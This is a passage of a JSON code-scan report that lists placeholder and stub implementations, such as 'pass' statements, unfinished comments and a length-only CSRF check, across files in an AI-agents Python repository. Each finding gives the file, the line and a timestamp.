        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 188: Placeholder implementation - email = st.text_input(\"📧 Email Address\", placeholder=\"Enter your email\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990709"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 189: Placeholder implementation - password = st.text_input(\"🔑 Password\", type=\"password\", placeholder=\"Enter your password\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990724"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "issue": "Line 754: Placeholder implementation - # Placeholder for strategy innovation detection",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.994650"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "issue": "Line 759: Placeholder implementation - # Placeholder for learning acceleration detection",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.994673"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\emergent_intelligence.py",
        "issue": "Line 826: Placeholder implementation - # Placeholder for specialization detection",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.994782"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\orchestrator.py",
        "issue": "Line 784: Placeholder implementation - # Placeholder implementations for complex analysis methods",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.997851"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Line 344: Placeholder implementation - # For now, return a placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.000894"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Line 345: Placeholder implementation - return f\"# Current implementation for {agent_name}.{component}\\n# Placeholder for actual code extraction\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.000904"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\autonomous\\self_modification.py",
        "issue": "Line 1149: Placeholder implementation - 'tests_passed': 0,",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.002130"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\business_intelligence.py",
        "issue": "Line 1404: Placeholder implementation - # For now, we'll create placeholder specialists",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.015585"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "issue": "Line 983: Placeholder implementation - # Placeholder implementations for complex operations",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.017922"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\deployment_manager.py",
        "issue": "Line 1077: Placeholder implementation - # Disaster recovery placeholder implementations",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.018075"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "issue": "Line 1079: Placeholder implementation - # Placeholder implementations for complex methods",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.020626"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "issue": "Line 1122: Placeholder implementation - return []  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.020698"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "issue": "Line 1126: Placeholder implementation - return []  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.020707"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\evolution_engine.py",
        "issue": "Line 1226: Placeholder implementation - # Additional helper methods with placeholder implementations",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.020865"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\orchestration\\orchestrator.py",
        "issue": "Line 290: Placeholder implementation - \"\"\"Execute task with agents in sequence, passing results forward\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.024925"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Line 122: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.026621"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Line 180: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.026723"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Line 249: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.026832"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Line 309: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.026927"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\high_performance_optimization.py",
        "issue": "Line 311: Placeholder implementation - optimizations_applied.append(\"Implemented efficient message passing with caching\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.026935"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Line 619: Placeholder implementation - \"\"\"Get cached discovery result - placeholder for actual cache implementation\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.033754"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Line 624: Placeholder implementation - \"\"\"Cache discovery result - placeholder for actual cache implementation\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.033774"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Line 626: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.033782"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Line 639: Placeholder implementation - 'cache_hit_rate': 'Not implemented',  # Would be calculated with Redis",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.033805"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\reasoning\\optimized_causal_inference.py",
        "issue": "Line 640: Placeholder implementation - 'memory_usage_mb': 'Not implemented',  # Would use memory profiler",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.033810"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "issue": "Line 466: Placeholder implementation - # For now, return empty list as placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.048021"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\behavioral_monitoring.py",
        "issue": "Line 472: Placeholder implementation - # For now, return empty list as placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.048042"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 114: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052458"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 119: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052473"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 124: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052484"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 138: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052506"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 144: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052517"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 149: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052527"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 154: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052537"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 163: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052553"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 168: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052563"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 173: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052574"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 178: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052584"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 191: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052607"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 196: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052618"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 205: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052633"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 210: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052643"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 261: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052715"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 266: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052726"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 296: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052770"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 301: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052781"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 306: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052791"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 319: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052813"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 324: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052823"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 329: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052834"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 334: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052845"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 347: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052866"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 352: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052877"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 357: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052888"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 362: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052898"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 375: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052919"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 380: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052929"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\shared\\interfaces.py",
        "issue": "Line 385: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.052940"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\security\\services\\security_service.py",
        "issue": "Line 418: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.055734"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "issue": "Line 213: Placeholder implementation - Optimized group-by operation using single pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.061186"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\performance\\optimization\\algorithm_optimizer.py",
        "issue": "Line 214: Placeholder implementation - Complexity: O(n) instead of multiple O(n) passes",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.061201"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\core\\integration\\orchestration\\orchestration_service.py",
        "issue": "Line 363: Placeholder implementation - raise ValueError(f\"Execution not implemented for pattern: {plan.pattern}\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.069209"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\cleanup\\root_files\\system_validation_report.py",
        "issue": "Line 508: Placeholder implementation - passed = sum(1 for r in self.results if r.status == \"pass\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.077991"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 77: Placeholder implementation - - Username/password",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080203"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 101: Placeholder implementation - \"\"\"Authenticate using username/email and password\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080250"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 103: Placeholder implementation - password = credentials.get(\"password\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080257"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 105: Placeholder implementation - if not identifier or not password:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080263"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 354: Placeholder implementation - def _verify_password(self, password: str, password_hash: str) -> bool:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080618"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 355: Placeholder implementation - \"\"\"Verify password against hash\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080623"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 356: Placeholder implementation - return pwd_context.verify(password, password_hash)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080628"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 358: Placeholder implementation - def _hash_password(self, password: str) -> str:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080634"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 359: Placeholder implementation - \"\"\"Hash password for storage\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080639"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 360: Placeholder implementation - return pwd_context.hash(password)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080643"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 410: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080723"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 415: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080734"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 420: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080744"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 425: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.080755"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 585: Placeholder implementation - # OAuth 2.0 integration (placeholder for future implementation)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081054"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 602: Placeholder implementation - raise NotImplementedError(\"OAuth integration coming soon\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081100"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 606: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081114"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 610: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081124"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\auth\\auth_manager.py",
        "issue": "Line 614: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081142"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\database\\session.py",
        "issue": "Line 178: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.081790"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "issue": "Line 654: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.085879"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "issue": "Line 295: Placeholder implementation - auth = aiohttp.BasicAuth(self.credentials.username, self.credentials.password)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.086646"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "issue": "Line 562: Placeholder implementation - return \"1000000\"  # Placeholder vendor code",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.087047"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "issue": "Line 567: Placeholder implementation - return \"V001\"  # Placeholder vendor code",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.087059"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
        "issue": "Line 321: Placeholder implementation - return len(csrf_token) > 10  # Placeholder validation",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.092601"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
        "issue": "Line 374: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.092709"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "issue": "Line 641: Placeholder implementation - return 0  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.097192"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "issue": "Line 663: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.097234"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "issue": "Line 605: Placeholder implementation - # For now, return empty dict as placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.106863"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "issue": "Line 672: Placeholder implementation - logger.warning(f\"Method {method} not implemented\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.107027"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "issue": "Line 311: Placeholder implementation - raise NotImplementedError(\"Subclasses must implement process_document_text\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.112967"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "issue": "Line 700: Placeholder implementation - \"learning_rate\": 0.1,  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.118910"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "issue": "Line 561: Placeholder implementation - # Placeholder - implement actual Claude API call",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.122935"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "issue": "Line 571: Placeholder implementation - # Placeholder - implement actual GPT API call",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.122956"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "issue": "Line 581: Placeholder implementation - # Placeholder - implement local model execution",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.122975"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 263: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127458"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 268: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:39.127479"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "issue": "Line 273: Placeholder implementation - pass",
